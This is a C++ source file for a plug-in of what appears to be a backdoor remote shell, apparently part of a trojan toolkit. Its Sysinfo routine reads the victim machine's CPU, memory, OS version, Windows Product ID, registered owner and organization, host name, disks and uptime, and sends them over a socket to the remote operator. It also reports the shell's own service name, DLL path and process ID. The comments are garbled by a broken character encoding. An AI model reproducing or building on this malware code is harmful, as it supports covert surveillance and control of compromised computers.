#include "ZXPLUG.h"
#include <locale.h>


struct LANGMAP
{
    int  LangID;
	char Language[30];
};

LANGMAP LangMap[106]=
{
	{0x0401,"Arabic (Saudi Arabia)"},
    {0x0801,"Arabic (Iraq)"},
    {0x0c01,"Arabic (Egypt)"},
    {0x1001,"Arabic (Libya)"},
    {0x1401,"Arabic (Algeria)"},
    {0x1801,"Arabic (Morocco)"},
    {0x1c01,"Arabic (Tunisia)"},
    {0x2001,"Arabic (Oman)"},
    {0x2401,"Arabic (Yemen)"},
    {0x2801,"Arabic (Syria)"},
    {0x2c01,"Arabic (Jordan)"},
    {0x3001,"Arabic (Lebanon)"},
    {0x3401,"Arabic (Kuwait)"},
    {0x3801,"Arabic (U.A.E.)"},
    {0x3c01,"Arabic (Bahrain)"},
    {0x4001,"Arabic (Qatar)"},
    {0x0402,"Bulgarian"},
    {0x0403,"Catalan"},
    {0x0404,"Chinese (Taiwan Region, PRC)"},
    {0x0804,"Chinese (PRC)"},
    {0x0c04,"Chinese (Hong Kong SAR, PRC)"},
    {0x1004,"Chinese (Singapore , PRC)"},
    {0x0405,"Czech"},
    {0x0406,"Danish"},
    {0x0407,"German (Standard)"},
    {0x0807,"German (Swiss)"},
    {0x0c07,"German (Austrian)"},
    {0x1007,"German (Luxembourg)"},
    {0x1407,"German (Liechtenstein)"},
    {0x0408,"Greek"},
    {0x0409,"English (United States)"},
    {0x0809,"English (United Kingdom)"},
    {0x0c09,"English (Australian)"},
    {0x1009,"English (Canadian)"},
    {0x1409,"English (New Zealand)"},
    {0x1809,"English (Ireland)"},
    {0x1c09,"English (South Africa)"},
    {0x2009,"English (Jamaica)"},
    {0x2409,"English (Caribbean)"},
    {0x2809,"English (Belize)"},
    {0x2c09,"English (Trinidad)"},
    {0x040a,"Spanish (Traditional Sort)"},
    {0x080a,"Spanish (Mexican)"},
    {0x0c0a,"Spanish (Modern Sort)"},
    {0x100a,"Spanish (Guatemala)"},
    {0x140a,"Spanish (Costa Rica)"},
    {0x180a,"Spanish (Panama)"},
    {0x1c0a,"Spanish (Dominican Republic)"},
    {0x200a,"Spanish (Venezuela)"},
    {0x240a,"Spanish (Colombia)"},
    {0x280a,"Spanish (Peru)"},
    {0x2c0a,"Spanish (Argentina)"},
    {0x300a,"Spanish (Ecuador)"},
    {0x340a,"Spanish (Chile)"},
    {0x380a,"Spanish (Uruguay)"},
    {0x3c0a,"Spanish (Paraguay)"},
    {0x400a,"Spanish (Bolivia)"},
    {0x440a,"Spanish (El Salvador)"},
    {0x480a,"Spanish (Honduras)"},
    {0x4c0a,"Spanish (Nicaragua)"},
    {0x500a,"Spanish (Puerto Rico)"},
    {0x040b,"Finnish"},
    {0x040c,"French (Standard)"},
    {0x080c,"French (Belgian)"},
    {0x0c0c,"French (Canadian)"},
    {0x100c,"French (Swiss)"},
    {0x140c,"French (Luxembourg)"},
    {0x040d,"Hebrew"},
    {0x040e,"Hungarian"},
    {0x040f,"Icelandic"},
    {0x0410,"Italian (Standard)"},
    {0x0810,"Italian (Swiss)"},
    {0x0411,"Japanese"},
    {0x0412,"Korean"},
    {0x0812,"Korean (Johab)"},
    {0x0413,"Dutch (Standard)"},
    {0x0813,"Dutch (Belgian)"},
    {0x0414,"Norwegian (Bokmal)"},
    {0x0814,"Norwegian (Nynorsk)"},
    {0x0415,"Polish"},
    {0x0416,"Portuguese (Brazilian)"},
    {0x0816,"Portuguese (Standard)"},
    {0x0418,"Romanian"},
    {0x0419,"Russian"},
    {0x041a,"Croatian"},
    {0x081a,"Serbian (Latin)"},
    {0x0c1a,"Serbian (Cyrillic)"},
    {0x041b,"Slovak"},
    {0x041c,"Albanian"},
    {0x041d,"Swedish"},
    {0x081d,"Swedish (Finland)"},
    {0x041e,"Thai"},
    {0x041f,"Turkish"},
    {0x0421,"Indonesian"},
    {0x0422,"Ukrainian"},
    {0x0423,"Belarusian"},
    {0x0424,"Slovenian"},
    {0x0425,"Estonian"},
    {0x0426,"Latvian"},
    {0x0427,"Lithuanian"},
    {0x0429,"Farsi"},
    {0x042a,"Vietnamese"},
    {0x042d,"Basque"},
    {0x0436,"Afrikaans"},
    {0x0438,"Faeroese"},
	{NULL  , ""},
};


char *CheckLang(int LangID)
{
     for(int i=0;i<105;i++)
		 if (LangID == LangMap[i].LangID)
			 return (LangMap[i].Language);
	 return "Unknown";
}

void GetSysName(char *RetBuf)
{
	char szBuf[MAX_PATH];
    BOOL              bOsVersionInfoEx;
    OSVERSIONINFOEX   osviex;
    memset(&osviex,0,sizeof(OSVERSIONINFOEX));
    strcpy(szBuf,"OS: ");
    osviex.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    if( !(bOsVersionInfoEx = ZXSAPI::GetVersionEx ((OSVERSIONINFO *) &osviex)) )
    {
		osviex.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);
		if (! ZXSAPI::GetVersionEx ( (OSVERSIONINFO *) &osviex) )  
			return;
    }
	switch (osviex.dwPlatformId)
    {
         
	    case VER_PLATFORM_WIN32_NT:	      
		if ( osviex.dwMajorVersion <= 4 )
              strcat(szBuf,"WinNT ");	      
		if ( osviex.dwMajorVersion == 5 && osviex.dwMinorVersion == 0 )
              strcat(szBuf,"Win2000 ");       
		if ( osviex.dwMajorVersion == 5 && osviex.dwMinorVersion == 1 )
              strcat(szBuf,"WinXP ");        
		if ( osviex.dwMajorVersion == 5 && osviex.dwMinorVersion == 2 )
              strcat(szBuf,"Win2003 ");

		if(bOsVersionInfoEx)
		{
			//Testfortheworkstationtype.
			if(osviex.wProductType==VER_NT_WORKSTATION)
			{
				 if(osviex.dwMajorVersion==4)
					 strcat(szBuf, "4.0");
				 else if(osviex.wSuiteMask&VER_SUITE_PERSONAL)
					 strcat(szBuf, "Home");
				 else
					 strcat(szBuf, "Pro");
			}

			//Testfortheservertype.
			else if(osviex.wProductType==VER_NT_SERVER)
			{
				 if(osviex.dwMajorVersion==5&&osviex.dwMinorVersion==2)
				 {
					 if(osviex.wSuiteMask&VER_SUITE_DATACENTER)
							 strcat(szBuf, "Datacenter Edition");
					 else if(osviex.wSuiteMask&VER_SUITE_ENTERPRISE)
							 strcat(szBuf, "Enterprise Edition");
					 else if(osviex.wSuiteMask==VER_SUITE_BLADE)
							 strcat(szBuf, "WebEdition");
					 else
							 strcat(szBuf, "Standard Edition");
				 }

				 else if(osviex.dwMajorVersion==5&&osviex.dwMinorVersion==0)
				 {
					 if(osviex.wSuiteMask&VER_SUITE_DATACENTER)
							 strcat(szBuf, "Datacenter Server");
					 else if(osviex.wSuiteMask&VER_SUITE_ENTERPRISE)
							 strcat(szBuf, "Advanced Server");
					 else
							 strcat(szBuf, "Server");
				 }

				 else//WindowsNT4.0
				 {
					 if(osviex.wSuiteMask&VER_SUITE_ENTERPRISE)
							 strcat(szBuf, "Server4.0, Enterprise Edition");
					 else
							 strcat(szBuf, "Server4.0");
				 }
			}
		}


	}

	sprintf(RetBuf,"%s SP%d.%d(%d)",szBuf, osviex.wServicePackMajor,osviex.wServicePackMinor,osviex.dwBuildNumber);

}
/*
BOOL AreWeRunningTerminalService()
{
	BYTE buf[0x11c] = {0};
	*(DWORD*)&buf[0] = 0x0000011c;
	*(DWORD*)&buf[0x11c-4] = 0x00000110;

	ULONGLONG dwlCM = VerSetConditionMask(0, VER_SUITENAME, VER_OR);

	return VerifyVersionInfoW((LPOSVERSIONINFOEXW)buf, VER_SUITENAME, dwlCM);
}
*/
void Sysinfo(SOCKET Socket)
{   
	SPAMFUNCTION
		
    char              SysInfo[MAX_PATH];
    char              szDisk[3];
    char              szFileSys[6] = "\0";
    unsigned long     dwUptime;
    HDC               hScrDC;  
    int               xScrn, yScrn,Bit,HZ, idx;
    ULARGE_INTEGER    FreeBytesAvailable,TotalNumberOfBytes,TotalNumberOfFreeBytes;
    unsigned __int64  TotalSpace,FreeSpace,FreeRate;

//CPU��Ϣ
	idx = 0;
	while(1)
	{
		sprintf(Temp, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\%d", idx++);
		if(ReadReg(HKEY_LOCAL_MACHINE,Temp,"ProcessorNameString", SysInfo, sizeof(SysInfo)))
		{
			SendMessage(Socket, "CPU %d: %s \r\n", idx, DelSpace(SysInfo));
		}
		else 
			break;
	}

//�ڴ�����
    MEMORYSTATUS mem; 
    mem.dwLength=sizeof(mem); 
    GlobalMemoryStatus(&mem);
    SendMessage(Socket, "RAM: %dMB Total , %dMB Free \r\n",mem.dwTotalPhys/1024/1024,mem.dwAvailPhys/1024/1024);

//��ǰ����ϵͳ
	memset(SysInfo,0,MAX_PATH);
	memset(Temp,0, sizeof(Temp));

	GetSysName(Temp);
	SendMessage(Socket, "%s\r\n", Temp);

//��ƷID,ע����֯,�û�,�������
	ReadReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion","ProductId",SysInfo, sizeof(SysInfo));
	SendMessage(Socket, "Product Id: %s\r\n", SysInfo);
	ReadReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion","RegisteredOwner",SysInfo, sizeof(SysInfo));
	SendMessage(Socket, "Owner: %s\r\n", SysInfo);
	ReadReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion","RegisteredOrganization",SysInfo, sizeof(SysInfo));
	SendMessage(Socket, "Organization: %s\r\n", SysInfo);
	if(gethostname(SysInfo, sizeof(SysInfo)) == 0)
		SendMessage(Socket, "Host Name: %s\r\n", SysInfo);
//ϵͳ����ʱ��
    dwUptime = GetTickCount();
	SendMessage(Socket, "Uptime: %-.2d Days %-.2d Hours %-.2d Minutes %-.2d Seconds \r\n",dwUptime/(3600000*24),(dwUptime%(3600000*24))/3600000,(dwUptime%3600000)/60000,(dwUptime%60000)/1000);
//ϵͳĿ¼
	memset(SysInfo,0,MAX_PATH);
    GetSystemDirectory(SysInfo,MAX_PATH);
    SendMessage(Socket, "System Directory: %s \r\n",SysInfo);
//ȡ��CPU����
    SYSTEM_INFO systeminfo;
	GetSystemInfo(&systeminfo);
    SendMessage(Socket, "Number of Processors: %d \r\n",systeminfo.dwNumberOfProcessors);
//ȡ��ϵͳ����
    //SendMessage(Socket, "The Default Language: %s \r\n",CheckLang(GetSystemDefaultLangID()));
    SendMessage(Socket, "Local: %s \r\n", setlocale(LC_ALL, ".OCP"));
//��ʾ���ֱ�Ƶ��
    hScrDC=ZXSAPI::CreateDC("Display", NULL, NULL, NULL);
    xScrn = ZXSAPI::GetDeviceCaps(hScrDC, HORZRES); 
    yScrn = ZXSAPI::GetDeviceCaps(hScrDC, VERTRES); 
    Bit   = ZXSAPI::GetDeviceCaps(hScrDC, BITSPIXEL);
    HZ    = ZXSAPI::GetDeviceCaps(hScrDC, VREFRESH);
	ZXSAPI::DeleteDC(hScrDC);
    SendMessage(Socket, "Current Display Mode: %d x %d (%dBit) (%dHz)\r\n",xScrn,yScrn,Bit,HZ);

//���������������� 
	SendMessage(Socket, "Disk Information:\r\n");
	for(int i=0;i<26;++i) 
    {  
       sprintf(szDisk,"%C:\\",'A'+i);
       UINT uType=GetDriveType(szDisk);
       switch(uType) 
	   {
	   case DRIVE_NO_ROOT_DIR:
		   break;
	   case DRIVE_REMOVABLE:
		   sprintf(SysInfo,"Drive %s (REMOVABLE)\r\n",szDisk); 
		   break;
	   case DRIVE_FIXED:
           GetVolumeInformation(szDisk,NULL,NULL,NULL,NULL,NULL,szFileSys,sizeof(szFileSys)) ; 
           GetDiskFreeSpaceEx(szDisk,&FreeBytesAvailable,&TotalNumberOfBytes,&TotalNumberOfFreeBytes);
           TotalSpace=TotalNumberOfBytes.QuadPart/(1024*1024);
           FreeSpace =TotalNumberOfFreeBytes.QuadPart/(1024*1024);
	       FreeRate  =100*TotalNumberOfFreeBytes.QuadPart/TotalNumberOfBytes.QuadPart;
           sprintf(SysInfo,"Drive %s (FIXED) [%5s]  Space Total:%5I64dMB  Free:%5I64dMB  FreeRate: %2I64d%%\r\n",szDisk,szFileSys,TotalSpace,FreeSpace,FreeRate); 
		   break;
	   case DRIVE_REMOTE:
           sprintf(SysInfo,"Drive %s (REMOTE) \r\n",szDisk); 
		   break;
	   case DRIVE_CDROM:
           sprintf(SysInfo,"Drive %s (CDROM) \r\n",szDisk); 
		   break;
	   case DRIVE_RAMDISK:
           sprintf(SysInfo,"Drive %s (RAMDISK) \r\n",szDisk); 
		   break;
	   default: //DRIVE_UNKNOWN
			
		   break;
	   }

	   if(uType!=DRIVE_NO_ROOT_DIR)
		   SendMessage(Socket,SysInfo);
	   memset(SysInfo,0,MAX_PATH);
   } 
//shell �İ�װ��Ϣ
   SendMessage(Socket, "\r\n"
	   "Shell setup information:\r\n"
	   "version: %.2f\r\n"
	   "rely service: %s\r\n"
	   "file path: %s\r\n"
	   "Pid: %d\r\n"
	   "plug-in: %d\r\n",
	   SHELLVERSION, ServiceName, g_DllPath, GetCurrentProcessId(), zxplug->GetPlugCount(false));
	
   SendMessage(Socket, "\r\nList System Infomation Completed\r\n");

}
